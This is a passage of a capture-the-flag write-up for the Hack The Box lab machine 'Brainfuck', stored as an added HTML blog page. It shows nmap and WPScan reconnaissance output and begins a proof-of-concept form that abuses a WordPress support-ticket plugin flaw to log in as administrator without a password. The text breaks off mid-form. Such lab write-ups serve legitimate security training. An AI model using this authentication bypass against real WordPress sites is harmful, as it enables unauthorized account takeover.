@@ -1,0 +1,886 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<!-- iOS Safari -->
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- Chrome, Firefox OS and Opera Status Bar Color -->
+<meta name="theme-color" content="#FFFFFF">
+<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
+<link rel="stylesheet" type="text/css"
+  href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
+<link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
+<link rel="stylesheet" type="text/css" href="css/theme.css">
+<link rel="stylesheet" type="text/css" href="css/notablog.css">
+<!-- Favicon -->
+
+  <link rel="shortcut icon" href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe7dae887-ad1b-438b-8674-40f561aa2ea3%2Fnoun-terminal-4364895.svg?table=collection&amp;id=c08d2689-cc7d-4fc6-bbcc-bf7b8739bc9b">
+
+<style>
+  :root {
+    font-size: 20px;
+  }
+</style>
+  <title>HTB Machine — Brainfuck&nbsp;|&nbsp;C:\Users\ch3ng &gt;_</title>
+  <meta property="og:type" content="blog">
+  <meta property="og:title" content="HTB Machine — Brainfuck">
+  
+    <meta name="description" content="First released in 2017, Brainfuck is one of the earleir HTB boxes. The difficulty is rated as insane, but by today’s standard, it’s probably just hard or even medium. It involves a WordPress privilege escalation exploit, interacting with mail protocols, and attacking two encryption algorithms. Escalating to root wasn’t in the intended path, but since the box is 7 years old now, there’s 2 ways to obtain a root shell.">
+    <meta property="og:description" content="First released in 2017, Brainfuck is one of the earleir HTB boxes. The difficulty is rated as insane, but by today’s standard, it’s probably just hard or even medium. It involves a WordPress privilege escalation exploit, interacting with mail protocols, and attacking two encryption algorithms. Escalating to root wasn’t in the intended path, but since the box is 7 years old now, there’s 2 ways to obtain a root shell.">
+  
+  
+    <meta property="og:image" content="https://labs.hackthebox.com/storage/avatars/391b0f0a41832d21577824602f02b177.png">
+  
+  <style>
+    .DateTagBar {
+      margin-top: 1.0rem;
+    }
+  </style>
+</head>
+
+<body>
+  <nav class="Navbar">
+  <a href="/">
+    <div class="Navbar__Btn">
+      
+        <span><img class="inline-img-icon" src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe7dae887-ad1b-438b-8674-40f561aa2ea3%2Fnoun-terminal-4364895.svg?table=collection&amp;id=c08d2689-cc7d-4fc6-bbcc-bf7b8739bc9b"></span>&nbsp;
+      
+      <span>Home</span>
+    </div>
+  </a>
+  <span class="Navbar__Delim">&centerdot;</span>
+  <a href="https://github.com/ch3ng625", target="_blank">
+    <div class="Navbar__Btn">
+      <span><img class="inline-img-icon" src="icons/github.svg"></span>&nbsp;
+      <span>GitHub</span>
+    </div>
+  </a>
+  <span class="Navbar__Delim">&centerdot;</span>
+  <a href="https://au.linkedin.com/in/chengw625/", target="_blank">
+    <div class="Navbar__Btn">
+      <span><img class="inline-img-icon" src="icons/linkedin.png"></span>&nbsp;
+      <span>LinkedIn</span>
+    </div>
+  </a>
+  <span class="Navbar__Delim">&centerdot;</span>
+  <a href="https://app.hackthebox.com/profile/786447", target="_blank">
+    <div class="Navbar__Btn">
+      <span><img class="inline-img-icon" src="icons/htb.svg"></span>&nbsp;
+      <span>HackTheBox</span>
+    </div>
+  </a>
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+</nav>
+
+  <header class="Header">
+    
+    <div class="Header__Spacer Header__Spacer--NoCover">
+    </div>
+    
+      <div class="Header__Icon">
+        <span><img class="inline-img-icon" src="https://labs.hackthebox.com/storage/avatars/391b0f0a41832d21577824602f02b177.png"></span>
+      </div>
+    
+    <h1 class="Header__Title">HTB Machine — Brainfuck</h1>
+    
+      <div class="DateTagBar">
+        
+          <span class="DateTagBar__Item DateTagBar__Date">Posted on Mon, Jun 3, 2024</span>
+        
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--blue">
+            <a href="tag/HTB">HTB</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--orange">
+            <a href="tag/Linux">Linux</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--purple">
+            <a href="tag/Insane">Insane</a>
+          </span>
+        
+      </div>
+    
+  </header>
+  <article id="https://www.notion.so/fcb080ed85bf4e3cbd4677f1cad33d56" class="PageRoot"><h3 id="https://www.notion.so/3de21abb6705425b99b25d6aeff3ff7c" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/3de21abb6705425b99b25d6aeff3ff7c"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Summary:</span></span></h3><div id="https://www.notion.so/52ee911d998f42b38b365c8382fbeaf6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">First released in 2017, Brainfuck is one of the earleir HTB boxes. The difficulty is rated as insane, but by today’s standard, it’s probably just hard or even medium. It involves a WordPress privilege escalation exploit, interacting with mail protocols, and attacking two encryption algorithms. Escalating to root wasn’t in the intended path, but since the box is 7 years old now, there’s 2 ways to obtain a root shell.</span></span></p></div><div id="https://www.notion.so/39c5178988e04ad480db9079c987df4c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/2c4b8e764faf4935b25ceb108f963fd3" class="Divider"></div><h3 id="https://www.notion.so/c363962751ce4e4992c92cca9d34b16b" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/c363962751ce4e4992c92cca9d34b16b"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Enumeration:</span></span></h3><div id="https://www.notion.so/dd90bf531a464a81a9cf0228193bdda1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Nmap:</strong></span></span></p></div><pre id="https://www.notion.so/3f2e5296fd414c0d9e96602a3a42838c" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/brainfuck]
+└─$</span></mark></span><span class="SemanticString"><span> sudo nmap --min-rate 1000 -p- 10.129.228.97
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-27 17:01 ACDT
+Nmap scan report for 10.129.228.97
+Host is up (0.34s latency).
+Not shown: 65530 filtered tcp ports (no-response)
+PORT    STATE SERVICE
+22/tcp  open  ssh
+25/tcp  open  smtp
+110/tcp open  pop3
+143/tcp open  imap
+443/tcp open  https
+
+Nmap done: 1 IP address (1 host up) scanned in 133.23 seconds
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/brainfuck]
+└─$</span></mark></span><span class="SemanticString"><span> sudo nmap -A -p 22,25,110,143,443 10.129.228.97
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-27 17:07 ACDT
+Nmap scan report for 10.129.228.97
+Host is up (0.34s latency).
+
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)
+|   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)
+|_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)
+25/tcp  open  smtp?
+|_smtp-commands: Couldn&#x27;t establish connection on port 25
+110/tcp open  pop3     Dovecot pop3d
+|_pop3-capabilities: SASL(PLAIN) PIPELINING TOP UIDL USER AUTH-RESP-CODE CAPA RESP-CODES
+143/tcp open  imap     Dovecot imapd
+|_imap-capabilities: LOGIN-REFERRALS more IDLE have AUTH=PLAINA0001 OK post-login ENABLE ID listed IMAP4rev1 Pre-login capabilities LITERAL+ SASL-IR
+443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
+| tls-alpn: 
+|_  http/1.1
+|_http-server-header: nginx/1.10.0 (Ubuntu)
+| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
+| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
+| Not valid before: 2017-04-13T11:19:29
+|_Not valid after:  2027-04-11T11:19:29
+|_ssl-date: TLS randomness does not represent time
+|_http-title: 400 The plain HTTP request was sent to HTTPS port
+| tls-nextprotoneg: 
+|_  http/1.1
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|specialized|phone|storage-misc
+Running (JUST GUESSING): Linux 3.X|4.X|5.X (90%), Crestron 2-Series (86%), Google Android 4.X (86%), HP embedded (85%)
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:crestron:2_series cpe:/o:google:android:4.0 cpe:/o:linux:linux_kernel:5.0 cpe:/h:hp:p2000_g3
+Aggressive OS guesses: Linux 3.10 - 4.11 (90%), Linux 3.12 (90%), Linux 3.13 (90%), Linux 3.13 or 4.2 (90%), Linux 3.16 (90%), Linux 3.16 - 4.6 (90%), Linux 3.2 - 4.9 (90%), Linux 3.8 - 3.11 (90%), Linux 4.2 (90%), Linux 4.4 (90%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 143/tcp)
+HOP RTT       ADDRESS
+1   342.40 ms 10.10.14.1
+2   341.83 ms 10.129.228.97
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 269.04 seconds</span></span></span></code></pre><div id="https://www.notion.so/8d316dffe9c94d89b5700d616e29a1d3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Interestingly, only HTTPS is open, as there’s no port 80. It’s SSL certificate revealed the host name and two subdomains. I’ll add all those to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/etc/hosts</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/f08701cdbd11487989927a471ade501e" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token comment"># HTB machine Brainfuck</span>
+<span class="token number">10.129</span>.228.97   brainfuck.htb   www.brainfuck.htb   sup3rs3cr3t.brainfuck.htb</span></span></span></code></pre><div id="https://www.notion.so/f1a6d27854d3461bba6aeb94228a4c76" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">There’s also several mail ports open.</span></span></p></div><div id="https://www.notion.so/681c544d69714ab0acee675dfd5cf674" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/07cdb2449ce5474680b97aaf9b2d0a4d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">TCP443 — HTTPS:</strong></span></span></p></div><div id="https://www.notion.so/9a9cd042b49a4a338d59215f2d769080" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F20751b09-fd2c-476c-9d1c-e52986d60de2%2FUntitled.png?width=1907&amp;table=block&amp;id=9a9cd042-b49a-4a33-8d59-215f2d769080"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F20751b09-fd2c-476c-9d1c-e52986d60de2%2FUntitled.png?width=1907&amp;table=block&amp;id=9a9cd042-b49a-4a33-8d59-215f2d769080" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/42bbe722ba184b039925dce5925ce017" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">www.brainfuck.htb</code></span><span class="SemanticString"> redirects back to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">brainfuck.htb</code></span><span class="SemanticString">, which is a simple WordPress page with a post by </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">admin</code></span><span class="SemanticString">. It also contains an email </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">orestis@brainfuck.htb</code></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/c575a90a721843c580ea7b4b5e24c284" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Wappalyzer detected the WordPress version to be 4.7.3, which was released in March 2017. Such an old version is bound to have lots of vulnerabilities.</span></span></p></div><div id="https://www.notion.so/dca13c914a6b447f9cd742008c118964" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Ff9d915b4-40b0-4f07-8c31-320e0dee3137%2FUntitled.png?width=491&amp;table=block&amp;id=dca13c91-4a6b-447f-9cd7-42008c118964"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Ff9d915b4-40b0-4f07-8c31-320e0dee3137%2FUntitled.png?width=491&amp;table=block&amp;id=dca13c91-4a6b-447f-9cd7-42008c118964" style="width:491px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/759ab9e3444c43d2a6f32e4f3728aebb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/0d16594b231948e5921b43ce1aba872d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">WPScan:</strong></span></span></p></div><div id="https://www.notion.so/7878a964437345b49901de74ba4698ce" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">As expected, WPScan found 85 vulnerabilities, including multiple RCE exploits.</span></span></p></div><pre id="https://www.notion.so/650d11d8261f48ecbabf7e074896b110" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/brainfuck]
+└─$</span></mark></span><span class="SemanticString"><span> wpscan --api-token $WPSCAN_API --url https://brainfuck.htb --disable-tls-checks
+
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#x27;_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.25
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[i] It seems like you have not updated the database for some time.
+[?] Do you want to update now? [Y]es [N]o, default: [N]y
+[i] Updating the Database ...
+[i] Update completed.
+
+[+] URL: https://brainfuck.htb/ [10.129.228.97]
+[+] Started: Tue Feb 27 18:54:11 2024
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: nginx/1.10.0 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: https://brainfuck.htb/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: https://brainfuck.htb/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: https://brainfuck.htb/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 4.7.3 identified (Insecure, released on 2017-03-06).
+ | Found By: Rss Generator (Passive Detection)
+ |  - https://brainfuck.htb/?feed=rss2, &lt;generator&gt;https://wordpress.org/?v=4.7.3&lt;/generator&gt;
+ |  - https://brainfuck.htb/?feed=comments-rss2, &lt;generator&gt;https://wordpress.org/?v=4.7.3&lt;/generator&gt;
+ |
+ | [!] 85 vulnerabilities identified:
+ |
+ 
+ &lt;..SNIP..&gt;
+
+[+] WordPress theme in use: proficient
+ | Location: https://brainfuck.htb/wp-content/themes/proficient/
+ | Last Updated: 2024-02-21T00:00:00.000Z
+ | Readme: https://brainfuck.htb/wp-content/themes/proficient/readme.txt
+ | [!] The version is out of date, the latest version is 8.5
+ | Style URL: https://brainfuck.htb/wp-content/themes/proficient/style.css?ver=4.7.3
+ | Style Name: Proficient
+ | Description: Proficient is a Multipurpose WordPress theme with lots of powerful features, instantly giving a prof...
+ | Author: Specia
+ | Author URI: https://speciatheme.com/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 1.0.6 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - https://brainfuck.htb/wp-content/themes/proficient/style.css?ver=4.7.3, Match: &#x27;Version: 1.0.6&#x27;
+
+[+] Enumerating All Plugins (via Passive Methods)
+[+] Checking Plugin Versions (via Passive and Aggressive Methods)
+
+[i] Plugin(s) Identified:
+
+[+] wp-support-plus-responsive-ticket-system
+ | Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/
+ | Last Updated: 2019-09-03T07:57:00.000Z
+ | [!] The version is out of date, the latest version is 9.1.2
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | [!] 6 vulnerabilities identified:
+ |
+ | [!] Title: WP Support Plus Responsive Ticket System &lt; 8.0.0 – Authenticated SQL Injection
+ |     Fixed in: 8.0.0
+ |     References:
+ |      - https://wpscan.com/vulnerability/f267d78f-f1e1-4210-92e4-39cce2872757
+ |      - https://www.exploit-db.com/exploits/40939/
+ |      - https://lenonleite.com.br/en/2016/12/13/wp-support-plus-responsive-ticket-system-wordpress-plugin-sql-injection/
+ |      - https://plugins.trac.wordpress.org/changeset/1556644/wp-support-plus-responsive-ticket-system
+ |
+  &lt;..SNIP..&gt; 
+ |
+ | [!] Title: WP Support Plus Responsive Ticket System &lt; 8.0.0 - Privilege Escalation
+ |     Fixed in: 8.0.0
+ |     References:
+ |      - https://wpscan.com/vulnerability/b1808005-0809-4ac7-92c7-1f65e410ac4f
+ |      - https://security.szurek.pl/wp-support-plus-responsive-ticket-system-713-privilege-escalation.html
+ |      - https://packetstormsecurity.com/files/140413/
+ |
+ | [!] Title: WP Support Plus Responsive Ticket System &lt; 8.0.8 - Remote Code Execution
+ |     Fixed in: 8.0.8
+ |     References:
+ |      - https://wpscan.com/vulnerability/85d3126a-34a3-4799-a94b-76d7b835db5f
+ |      - https://plugins.trac.wordpress.org/changeset/1763596
+ |
+ | Version: 7.1.3 (80% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:43 &lt;=============================================================================================================================================================&gt; (137 / 137) 100.00% Time: 00:00:43
+
+[i] No Config Backups Found.
+
+[+] WPScan DB API OK
+ | Plan: free
+ | Requests Done (during the scan): 3
+ | Requests Remaining: 22
+
+[+] Finished: Tue Feb 27 18:55:13 2024
+[+] Requests Done: 188
+[+] Cached Requests: 5
+[+] Data Sent: 46.192 KB
+[+] Data Received: 17.819 MB
+[+] Memory used: 237.57 MB
+[+] Elapsed time: 00:01:02</span></span></span></code></pre><div id="https://www.notion.so/8df688ce57214969b1b708933dc34e71" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Ignoring all findings later than 2017, there’s a few findings related to the Responsive Ticket System plugin, one of which is a privilege escalation attack.</span></span></p></div><div id="https://www.notion.so/dea5b48b1a8a4cd0ad88c24808887823" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/3a2ea0f42031466286bfac9fe0104f32" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">sup3rs3cr3t.brainfuck.htb</strong></code></span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">:</strong></span></span></p></div><div id="https://www.notion.so/f64a657a75624334a09d66b611cfb360" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F860eca29-09d3-496f-a5fc-6b2bd43df467%2FUntitled.png?width=1215&amp;table=block&amp;id=f64a657a-7562-4334-a09d-66b611cfb360"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F860eca29-09d3-496f-a5fc-6b2bd43df467%2FUntitled.png?width=1215&amp;table=block&amp;id=f64a657a-7562-4334-a09d-66b611cfb360" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/ced22e01a6e6404db1a307ecba8f06bb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">This subdomain is a secret forum. The “Development” thread is readable without authentication, but nothing interesting is found, apart from the username </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">orestis</code></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/253016cb306b49899cf341ea1b5876be" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F738d9615-5dc2-4c66-b246-c2fa65be8426%2FUntitled.png?width=1168&amp;table=block&amp;id=253016cb-306b-4989-9cf3-41ea1b5876be"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F738d9615-5dc2-4c66-b246-c2fa65be8426%2FUntitled.png?width=1168&amp;table=block&amp;id=253016cb-306b-4989-9cf3-41ea1b5876be" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/15775b011e9847e18cf8ff3b5f340b9c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I can sign up as a new user, but nothing new is found.</span></span></p></div><div id="https://www.notion.so/3596828be2dc43229bb28ae50add5af6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/8b6a5f62bb764585b10ec045614f90f2" class="Divider"></div><h3 id="https://www.notion.so/241ea1496e9c4cbcb91c0c163ab9ee40" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/241ea1496e9c4cbcb91c0c163ab9ee40"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Exploitation:</span></span></h3><div id="https://www.notion.so/a714d937ea524860bd562fd6e475c25d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">WordPress Privilege Escalation:</strong></span></span></p></div><div id="https://www.notion.so/45f5e22bc7884254a9347b8ae6264909" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">According to WPScan’s </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://wpscan.com/vulnerability/b1808005-0809-4ac7-92c7-1f65e410ac4f/">post</a></span><span class="SemanticString">, the vulnerability stems from </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">wp_set_auth_cookie()</code></span><span class="SemanticString"> and allows logging in as anyone without the password. It also provided a handy proof of concept. I modified the URL to point to the correct host:</span></span></p></div><pre id="https://www.notion.so/1c94a8576e1440dd9fdadc5b9e264b66" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://brainfuck.htb/wp-admin/admin-ajax.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+	Username: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>administrator<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
